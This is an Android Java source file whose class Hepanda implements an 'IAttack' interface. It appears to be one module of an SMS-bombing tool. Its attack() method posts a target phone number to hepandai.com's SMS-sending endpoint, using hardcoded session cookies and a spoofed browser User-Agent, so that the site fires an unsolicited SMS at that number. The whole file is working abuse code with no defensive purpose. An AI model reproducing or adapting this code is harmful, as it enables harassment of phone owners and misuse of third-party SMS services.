package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Hepanda implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "indentitycode=015c8c70f530735a1767c9871236e1ba&mould=S001&channeltype=11&n=0&p=" + Utils.getNumber(MainApplication.context);

        Request request = new Request.Builder()
                .url("http://www.hepandai.com/Sms/PostSendNL")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "aliyungf_tc=AQAAAJaIJGHY6wgAry5k00YAGGwaMJap; topad=142; scrollTop=0; ASP.NET_SessionId=nna5cvkyipzglbwcbbjwlunp; dt_session_code=EXbB; Hm_lvt_48c03a850f3eaeb9ce25f6dd70be27d4=1450271002,1450271015; Hm_lpvt_48c03a850f3eaeb9ce25f6dd70be27d4=1450271036; 9jzq_31e4_saltkey=R5KqXnzu; 9jzq_31e4_lastvisit=1450267404; 9jzq_31e4_lastact=1450271015%09api.php%09js; sgsa_id=hepandai.com|1450271015582365; sgsa_vt_277701_285711=1450271035757; _adwb=230492698; _adwc=230492698; _adwp=230492698.5217916528.1450271016.1450271016.1450271016.1; _adwr=230492698%23http%253A%252F%252Fwww.rong360.com%252Flicai-p2p%252Fpingtai-615")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                Log.d("hello", e.getMessage());
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
